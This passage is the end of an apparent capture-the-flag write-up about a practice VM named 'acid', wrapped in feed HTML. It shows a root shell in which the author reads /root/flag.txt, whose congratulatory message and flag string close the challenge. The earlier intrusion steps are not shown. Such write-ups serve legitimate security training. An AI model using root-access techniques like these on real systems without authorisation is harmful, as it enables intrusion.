</span><span class='line'><span class="p">|</span> <span class="p">|</span>   / _ <span class="se">\|</span> <span class="s1">&#39;_ \ / _` | &#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span> __<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> __<span class="p">|</span> <span class="p">|</span>/ _ <span class="se">\|</span> <span class="err">&#39;</span>_ <span class="se">\/</span> __<span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="p">|</span>__<span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="se">\_</span>_ <span class="se">\</span>
</span><span class='line'> <span class="se">\_</span>___<span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_, <span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>_<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>_<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>___/
</span><span class='line'>                  <span class="p">|</span>___/
</span><span class='line'>root@acid:/tmp# <span class="nb">cd</span> /root
</span><span class='line'><span class="nb">cd</span> /root
</span><span class='line'>root@acid:~# ls
</span><span class='line'>ls
</span><span class='line'>flag.txt
</span><span class='line'>root@acid:~# cat flag.txt
</span><span class='line'>cat flag.txt
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Dear Hax0r,
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>You have successfully completed the challenge.
</span><span class='line'>
</span><span class='line'>I  hope you like it.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>FLAG NAME: <span class="s2">&quot;Acid@Makke@Hax0r&quot;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Kind <span class="p">&amp;</span> Best Regards
</span><span class='line'>
</span><span class='line'>-ACID
</span><span class='line'>facebook: https://facebook.com/m.avinash143
</span></code></pre></td></tr></table></div></figure>


<p>Mission Accomplished.</p>
]]></content>
  </entry>
  
</feed>
